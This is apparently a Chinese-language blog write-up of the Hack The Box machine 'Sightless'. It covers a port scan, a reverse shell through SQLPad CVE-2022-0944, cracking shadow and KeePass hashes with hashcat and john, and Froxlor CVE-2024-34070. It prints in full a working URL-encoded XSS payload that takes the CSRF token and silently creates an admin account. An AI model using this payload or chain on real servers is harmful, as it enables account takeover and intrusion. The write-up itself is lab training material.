---
layout: post
title: HTB——Sightless
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Sightless/01.png?raw=true)

# 0x01 信息收集

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.5  Expired: 2026.01.01
[06:07:24] [INFO] Start IpScan:10.129.123.59
[06:07:24] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[06:07:26] [+] 10.129.123.59:21 open
[06:07:26] [+] 10.129.123.59:22 open
[06:07:26] [+] 10.129.123.59:80 open
[06:07:26] [+] [TCP/SSH]  [OpenSSH 8.9p1 Ubuntu 3ubuntu0.10] 10.129.123.59:22 [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10]
[06:07:26] [INFO] start SSH check 10.129.123.59:22
[06:07:26] [+] 开始 SshScan 任务: SSH://10.129.123.59:22
端口扫描   7% [█░░░░░░░░░░░░░░░░░░░] (5197/65535) [0s:8s][06:07:27] [+] [TCP/HTTP] [200] [nginx/1.18.0 (Ubuntu)] http://10.129.123.59:80 [Sightless.htb]  
                                                           
[06:07:51] [+] alive ports is: 3
[06:07:51] [+] Ip扫描结束:10.129.123.59
[06:07:51] [INFO] Start UrlScan:http://10.129.123.59:80
[06:07:54] [+] [TCP/HTTP] [200] [nginx/1.18.0 (Ubuntu)] http://10.129.123.59:80 [Sightless.htb]
                                                 
[06:07:54] [+] Url扫描结束:http://10.129.123.59:80
[06:07:54] [+] 项目任务完成:Default, Timeuse：30.017451986
[06:07:54] [+] 扫描结束,耗时: 30.69772734s
```

---

# 0x02 CVE-2022-0944

---

访问80服务，我们发现除去主域名`sightless.htb`外，还有一个服务存在于子域名`sqlpad`上，添加进hosts我们继续测试。查看页面发现sqlpad版本号为6.10.0。查找有无可用CVE

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Sightless/02.png?raw=true)

`CVE-2022-0944`为可用的CVE编号。从github上可以直接找到可用的脚本。

- [0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944: Refurbish](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944)

将shell反弹回来后，我们查看`container`内内容，发现`shadow`文件内还存放了michael的密码。提取后我们尝试使用hashcat爆破。

```bash
root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

搜索hashcat使用指南发现，我们需要使用的模式为`sha512crypt $6$, SHA512 (Unix)`,模式即为1800

```cmd
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa....L2IJD/
Time.Started.....: Mon Apr 07 13:33:38 2025 (0 secs)
Time.Estimated...: Mon Apr 07 13:33:38 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   173.1 kH/s (8.93ms) @ Accel:512 Loops:128 Thr:128 Vec:1
Speed.#2.........:     1940 H/s (10.74ms) @ Accel:16 Loops:8 Thr:1024 Vec:1
Speed.#*.........:   175.0 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 65536/14344385 (0.46%)
Rejected.........: 0/65536 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:224-232
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> sabrina7
Candidates.#2....: ryanscott -> janson
Hardware.Mon.#1..: Temp: 49c Util: 15% Core: 232MHz Mem:14001MHz Bus:8
Hardware.Mon.#2..: N/A
```

使用爆破出的密钥SSH登录靶机即可获取`user.txt`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Sightless/03.png?raw=true)

---

# 0x03 SSL端口转发&CVE-2024-34070

使用netstat查看发现靶机内还开着一个8080端口的服务，使用SSH -L转发到本地后查看，是一个`froxlor`服务。搜索CVE，发现一个`CVE-2024-34070`.使用GITHUB页面的两个payload依次发送，即可创建一个`abcd:Abcd@@1234`的服务账户用于登录。payload如下

```bash
admin%7B%7B$emit.constructor%60function+b()%7Bvar+metaTag%253ddocument.querySelector('meta%5Bname%253d%22csrf-token%22%5D')%253bvar+csrfToken%253dmetaTag.getAttribute('content')%253bvar+xhr%253dnew+XMLHttpRequest()%253bvar+url%253d%22http%253a//admin.sightless.htb:8080/admin_admins.php%22%253bvar+params%253d%22new_loginname%253dabcd%2526admin_password%253dAbcd%2540%25401234%2526admin_password_suggestion%253dmgphdKecOu%2526def_language%253den%2526api_allowed%253d0%2526api_allowed%253d1%2526name%253dAbcd%2526email%253dyldrmtest%2540gmail.com%2526custom_notes%253d%2526custom_notes_show%253d0%2526ipaddress%253d-1%2526change_serversettings%253d0%2526change_serversettings%253d1%2526customers%253d0%2526customers_ul%253d1%2526customers_see_all%253d0%2526customers_see_all%253d1%2526domains%253d0%2526domains_ul%253d1%2526caneditphpsettings%253d0%2526caneditphpsettings%253d1%2526diskspace%253d0%2526diskspace_ul%253d1%2526traffic%253d0%2526traffic_ul%253d1%2526subdomains%253d0%2526subdomains_ul%253d1%2526emails%253d0%2526emails_ul%253d1%2526email_accounts%253d0%2526email_accounts_ul%253d1%2526email_forwarders%253d0%2526email_forwarders_ul%253d1%2526ftps%253d0%2526ftps_ul%253d1%2526mysqls%253d0%2526mysqls_ul%253d1%2526csrf_token%253d%22%252bcsrfToken%252b%22%2526page%253dadmins%2526action%253dadd%2526send%253dsend%22%253bxhr.open(%22POST%22,url,true)%253bxhr.setRequestHeader(%22Content-type%22,%22application/x-www-form-urlencoded%22)%253balert(%22Your+Froxlor+Application+has+been+completely+Hacked%22)%253bxhr.send(params)%7D%253ba%253db()%60()%7D%7D&
```

登录后我们可以修改web1用户的FTP密码，我们修改密码后使用FTP上线web1。注意此改密码的界面为web1账户的FTP界面，而非customer内的登陆密码修改。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Sightless/04.png?raw=true)

这里我们使用kali的filezilla进行FTP的连接。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Sightless/05.png?raw=true)

获取到数据库文件`Database.kdb`。

- [利用 hashcat 回忆（破解）遗忘的 Keepass 密码 | Silearner](https://blog.chaos.run/dreams/hashcat-recall-keepass-password/index.html)

kdb文件解密过程，不再赘述。使用keepass2john提取出hash后交由john爆破即可,并且注意导出的hash`Database.kdb`文件前缀需要删掉。笔者尝试了hashcat，但是5080跑了两分钟出不来就放弃了。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Sightless]
└─# keepass2john Database.kdb > sightless.hash
Inlining Database.kdb


┌──(root㉿kali)-[/home/kali/HTB/Sightless]
└─# john sightless.hash -w /usr/share/wordlists/rockyou.txt --format=KeePass
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 1 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
bulldogs         (?)     
1g 0:00:00:00 DONE (2025-04-07 09:28) 2.439g/s 39.02p/s 39.02c/s 39.02C/s bulldogs..mickey
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

拿到密钥后，我们在widows主机上启动KeePass解密，或kali内部的对应工具。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Sightless/06.png?raw=true)

拿到root的账密与私钥，靶机就算是打完了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Sightless/07.png?raw=true)